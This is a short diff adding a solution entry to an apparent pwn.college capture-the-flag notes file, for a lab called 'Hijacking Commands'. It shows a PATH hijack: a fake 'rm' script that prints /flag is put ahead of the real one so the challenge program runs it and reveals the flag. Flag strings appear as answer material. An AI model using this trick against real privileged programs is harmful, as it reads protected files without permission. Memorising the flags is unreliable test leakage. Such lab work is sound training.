@@ -51,5 +51,11 @@ pwn.college{Qy3KMGvZNG5taSv5RZgJP-MufIp.QX2cjM1wiMwEzNzEzW}
 # Hijacking Commands
 code:
 ```
-
+hacker@path~hijacking-commands:~$ mkdir /tmp/pwn
+hacker@path~hijacking-commands:~$ echo "/bin/cat /flag" > /tmp/pwn/rm
+hacker@path~hijacking-commands:~$ chmod +x /tmp/pwn/rm
+hacker@path~hijacking-commands:~$ PATH="/tmp/pwn:$PATH" /challenge/run
+Trying to remove /flag...
+Found 'rm' command at /tmp/pwn/rm. Executing!
+pwn.college{UWef9y3tb1SenryNHuSpuNnx-PG.QX3cjM1wiMwEzNzEzW}
 ```
